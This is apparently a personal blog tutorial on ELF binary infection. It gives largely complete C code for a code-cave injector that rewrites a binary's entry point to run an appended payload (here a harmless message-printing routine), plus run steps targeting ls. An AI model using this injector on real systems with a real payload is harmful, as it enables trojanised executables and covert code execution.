+++
title = "Injecting ELF files"
date = "2020-04-25"
author = "vlaghe"
authorTwitter = "vlagh3" #do not include @
cover = ""
tags = ["linux", "c"]
keywords = ["", ""]
description = ""
showFullContent = false
readingTime = true
hideComments = false
+++

Today we will continue talking about ELF files by starting to play with the headers so I’ll show you how to inject an ELF binary. This may help you get more familiar with ELF binaries and also show you the real power of it.
Ok, so with all of that being said let’s dive into it.

## Infection Technique
This technique it’s a relative simple one but perfect for our purpose. It consists of the following steps:
 1. Find the padding area between `.text` section and the next segment in the program.
 2. Append the payload at the end of the `.text` section *(in that padding area)*.
 3. Patch the ELF header to run the injected code at startup, this is done by modifying the entry point.
 4. Patch the payload, so it can resume the normal execution of the program *(original entry point)*.

We are going to take advantage of the padding area *(that is almost always there)* between segments. This basically happens because the operating system works with Page granularity and because of the way the segments are loaded into memory.

Anyway, in general it’s an unused area at the end of the `.text` section. The size of the padding depends on the size of the code, so it may vary from program to program. For that reason, some programs may not be able to be injected. *(I will let you guys find another creative ways to make it more efficient and reliable. 🙂 )*

 
## Writing the injector

I will not show the whole code. Instead, I will divide it in some of the most important functional blocks, so it will be easier to follow.
You can find the whole source code and some of the newest implementations [on github](https://github.com/vlagh3/elij).
Opening and mapping the target file & the payload
```c
int main(int argc, char *argv[]) {
	….
	if(argc < 3)
	{
		printf("Usage: %s <file to inject> <payload>\n", argv[0]);
		exit(1);
	}

	target_fd    = open_and_map(argv[1], &tsize, &data );
	payload_fd   = open_and_map(argv[2], &psize, &data1);
	…..
}
```

This code is pretty straightforward. We have a small check on the arguments we pass. After, we pass *(to the `open_and_map` function)* 2 variables that will store the file size and a pointer to the beginning of our file. Then, we get the file desciptors for both the payload and target file.

Let’s take a look at the `open_and_map` function.

```c
int open_and_map(char *filename, int *fsize, void **data) {
	int fd;
	*fsize = get_size(filename);

	if( (fd = open(filename, O_RDWR, 0)) < 0)
	{
		perror("[!] Failed to open \n");
		exit(1);
	}
	….
}
```
This function takes 3 arguments, as said earlier. First, we store the filesize with the helper function `get_size` *(I’m not including it here, because it’s basically just calling stat on the filename and returning its size)*. After, we open the file with read and write permissions and then the good old error checking.
```c
if( (*data = mmap(0, *fsize, PROT_READ | PROT_WRITE | PROT_EXEC,   MAP_SHARED, fd, 0)) == MAP_FAILED )
   	{
		perror("[!] Failed to mmap\n");
		close(fd);
		exit(1);
	}
	printf("[+] File %s mapped and oppened (%d bytes) at %p\n", filename, *fsize, data);

	return fd;
}
``` 

The second part of the function just maps the file into memory *(so we can make changes to the file without dealing with fread, lseek and all of that stuff; instead we use pointers. This way, we are now having a very convenient way to patch a file)* and returns the file descriptor. Because of the two output parameters now we also have a pointer to the start of the file and it’s size.

Now that we have access to our file we can store some information.

```c
elf_header = (Elf64_Ehdr *) data;
e_point	   = elf_header->e_entry;
printf("[+] Entry point of %s: 0x%x\n", argv[1], (unsigned int)e_point)
```


We can retrieve this kind of data because the pointer returned by `open_and_map` function points to the actual content of the file. Thus we find the ELF header as the first thing in the file. The entry point is contained in the ELF header along with other useful information, so we just reference that information with the pointer that we’ve got to the ELF header. If you are  still confused about this, take a look at the [Exploring the ELF file structure article](https://vlagh3.github.io/posts/elf_struct/) that I made and then look at the specs to understand what kind of information is kept by this structure.

 
### Finding the padding between the two `LOAD` segments.

Now we need to find the padding I was talking about in the beginning of this article. Some may reffer to it as a codecave.
Anyway, I wrote a function that it’s called from main.

```c
t_txt_seg_ptr = find_codecave(data, tsize, &txt_end, &cave_size);
base = t_txt_seg_ptr->p_vaddr;
```

The `find_codecave` function will go through all the ELF segments and try to find a padding between the two `LOAD` segments that we have discussed earlier. It returns a pointer to the first LOAD segment structure that we will need later. It also returns the offset in the file to the padding and it’s size.

After we get all of that, we store the base virtual address where the code will be loaded into memory for that specific segment. This is usually `0x400000`, but I wanted to be sure about this.
The `find_codecave` function looks like this:

```c
Elf64_Phdr* find_codecave(void *ptr_elf, int fsize, int *offset, int *cave_size) {

	/* 
		Declare the needed variables.
		Calculate the elf segment ptr.
		Get the total number of segments.
	*/
	Elf64_Ehdr *ehdr = (Elf64_Ehdr *) ptr_elf;
	Elf64_Phdr *txt_segment, *elf_segment = (Elf64_Phdr *) ((unsigned char *) ehdr+ (unsigned int)ehdr->e_phoff);
	int total_segments = ehdr->e_phnum;
	int codecave = fsize;
	int txt_end;



	/*
		Traverse all the segments with type of PT_LOAD.
		Get a pointer to the entry and the offset ,of the one with execute permissions.
		Find codecave between the 2 segments.
	*/ 
	for(int i = 0; i < total_segments; i++) 
	{

		// printf("[%d] V_addr: %x\n", i, elf_segment->p_vaddr + elf_segment->p_filesz);
		if( elf_segment->p_type == PT_LOAD && elf_segment->p_flags == 0x5)
		{
			printf("[+] (#%d) LOAD segment found w execute flag (%d bytes).\n", i, (unsigned int)elf_segment->p_filesz);
			txt_segment = elf_segment;
			txt_end		= elf_segment->p_offset + elf_segment->p_filesz;
		}
		else
		{
			if( elf_segment->p_type == PT_LOAD && (elf_segment->p_offset - txt_end) < codecave )
			{
				printf("[+] (#%d) LOAD segment that can be injected found (%d bytes) near .text at offset: %p\n", 
					   i, (unsigned int)elf_segment->p_filesz, (void *)elf_segment->p_offset);
				codecave = elf_segment->p_offset - txt_end;
			}
		}
		elf_segment = (Elf64_Phdr *) ((unsigned char*)elf_segment + (unsigned int)ehdr->e_phentsize);
	}

	*offset    = txt_end;
	*cave_size = codecave;
	return txt_segment;
}
```

I know this looks very intimidating at first but it’s not that hard after all. We basically take 4 arguments: the first is the pointer from the beginning of our file *(the one that we used to retrieve the elf header)*, the second is just the file size and the last 2 are there just for retrieving back to the main program the offset to the padding and its size.

So, after we have the elf header we can calculate the pointer to the program header table that stores all of our segments. We get the total number of segments by accessing the `e_phnum` attribute.
Then, we just traverse all of the segments looking for a segment of type `PT_LOAD` with read/execute permissions. Normally, there is only one and it’s containing the `.text` section which contains the application code. When we find it, we store a pointer to it that we will return later and also calculate the offset to the end of the .text section.
Then we keep looking for segments with type `PT_LOAD` and we calculate the padding between the 2 ones.
> **NOTE**: Normally there are only 2 `PT_LOAD` segments, so this function can be improved. I will let this as an exercise for the reader. 😀

 
## The Payload

It’s time to take a look at the payload itself, what it does and how to get it into memory. For the sake of this article, it consists of a simple classical hello world program written in assembly. I didn’t want to get dirty and complicated, so we can focus on the ELF injection process itself. Enough speaking let’s look at it.

```c
section .text
    global _start


_start:
   ;; save cpu state
   push rax
   push rdi
   push rsi
   push rdx


   ;; do your evil thing
   mov rax, 1             ; syscall number
   mov rdi, 1             ; fd = 1(stdout)
   lea rsi, [rel msg]     ; pointer to msg (char* [])
   mov rdx, msg_end - msg ; size
   syscall                ; ( SYS_write = rax(1), fd = rdi(1), buff = rsi(char *msg), size = rdx(len(msg)))

   ;; restore cpu state
   pop rdx
   pop rsi
   pop rdi
   pop rax

   ;; jump to main
   mov rax, 0x1111111111111111    ; set rax back to normal
   jmp rax                        ; jump to it

align 8
   msg      db '... --- -.-- --- ..- .-.. .. -.- . -- --- .-. ... . -.-. --- -.. . .-. .. --. .... - ··--··', 0xae, 0
   msg_end  db 0x0
```

Ok, we just push everything to the stack, so we can get back the original state of the registers. Then we initialize the arguments on the specific registers making the system call afterwards. We restore the registers *(as we pushed them in the first place)* and then set rax to the initial entry point of the program and jump to it.
> **Note**: We placed a placeholder there (`0x1111111111111111`), so we can modify it from the injector script later.

 
### Retrieving the payload

In order to retrieve the payload, we first need to find the `.text` section where the code resides. This is done via the `find_section` function that takes as arguments a pointer to the start of the file and the section we want to search for.

```c
p_txt_sec_ptr = find_section(data1, ".text");
```
The function gets the elf header using the pointer passed as the first argument and then calculates the start of the Section Program Header. Thus we get a pointer to it.

```c
Elf64_Shdr* find_section(void *ptr_elf, char *query) {
	/*
		Set up the ptr to the elf header, section table.
		Also, get the total numbers of sections and declare var for the section name.
	*/
	Elf64_Ehdr *ehdr 	= (Elf64_Ehdr *) ptr_elf;
	Elf64_Shdr *elf_sec = (Elf64_Shdr *)(ptr_elf + ehdr->e_shoff);
	int total_sec = ehdr->e_shnum;
	char *sname;

	/*
		Create a list that would fit all the section strings.
			
	*/
	Elf64_Shdr *sec_strtab 			 = &elf_sec[ehdr->e_shstrndx];
	const char *const sec_strtab_ptr = ptr_elf + sec_strtab->sh_offset; 

	printf("[+] Searching for %s section.\n", query);

	/*

	*/
	for(int i = 0; i < total_sec; i++)
	{
		sname = sec_strtab_ptr + elf_sec[i].sh_name;
		if(!strcmp(sname, query))
		{
			printf("[+] %s section found.\n", query);
			return &elf_sec[i];	
		} 
	}

	return NULL;
}
```

In order to get the section names we need to access the String Header Section Table (`.shstrtab`) in the ELF file. That table stores all the section names required for the executable. Now that we clarified that, we can move on and see what the next part of the code does. So, we get a pointer to the `.shstrtab` by adding the specific offset to the beginning of the file. Then, we iterate over all the sections in the ELF file and retrieve the name of the section by adding to the `sec_strtab_ptr` the index where the name resides.

 
### Processing The Payload

After we know where the `.text` section of the payload is, we can check to see if the payload fits into the padding found earlier. Then copy the payload code at the end of the `.text` section in the target file, using the offset returned by the `find_codecave` function.

```c
// If the payload is to big to fit in the codecave, exit.
	if(p_txt_sec_ptr->sh_size > cave_size)
	{
		perror("[!] Payload to big to inject.\n");
		close(target_fd);
		close(payload_fd);
		exit(1);
	}

	// Inject payload
	memmove(data + txt_end, data1 + p_txt_sec_ptr->sh_offset, p_txt_sec_ptr->sh_size);
```

## Finishing it up
Finally, with a little help of pointer dancing and the `patch_target` function, we can change the entry point of the file with the evil one and replace the placeholder with the original entry point. I will not include the code here since this is basically just scanning the whole code of the payload, searching for the pattern passed by the second argument and replacing it with the entry point passed by the 4th argument.

```c
// Patch the return address after executing the payload
patch_target(data + txt_end, 0x1111111111111111, p_txt_sec_ptr->sh_size, (long)e_point);

// Change entry point
elf_header->e_entry = (Elf64_Addr)(base + txt_end);
```

# Proof of concept

1. Just compile the elf injector like any other normal C program: `gcc elf_inejctor.c -o elf`
2. Generate the payload: `nasm -f elf64 -o payload.o payload.asm && ld -o payload payload.o`
3. RUN IT!: `./elf ls payload`

> **NOTE**: If you want to inspect the code more carefully you can check it [@ my github](https://github.com/vlagh3/elij) as always

 
# Final words
In this article I have shown you a simple way of executing arbitrary code on an ELF file by injecting it.
I hope you enjoyed and now you can see how many things you can do if you master the ELF file structure.
I will come back with more things on ELF files because I have some ideas for the future. Until then, think of your own implementations!
Thank you for reading, and I will see you next time !
